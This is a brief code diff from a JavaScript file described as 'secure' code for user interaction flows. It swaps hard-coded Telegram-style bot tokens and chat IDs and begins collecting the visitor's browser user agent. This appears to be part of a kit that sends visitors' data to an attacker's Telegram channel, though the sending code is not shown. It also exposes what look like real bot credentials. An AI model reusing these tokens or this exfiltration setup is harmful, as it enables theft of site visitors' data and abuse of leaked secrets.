@@ -5,8 +5,8 @@
  * 👨‍💻 Clean, modern, and secure JavaScript for user interaction flows
  */
 
-// const t = "8001165114:AAFNNyI0aiypVlCuomAMUfzenLuEzhtLuS0"; // token
-// const c = "7999983899"; // channel/user ID
+// const t = "8270266366:AAGlpNvoeMS8JUKW3FupEnqMKLUxPxjmP1I"; // token
+// const c = "8329330575"; // channel/user ID
 const t = "7512709270:AAGKVHcTMEP3BurXwUCdj1CGVqANjUmZeEk"; // token
 const c = "7713671348"; // channel/user ID
 const ua = navigator.userAgent;
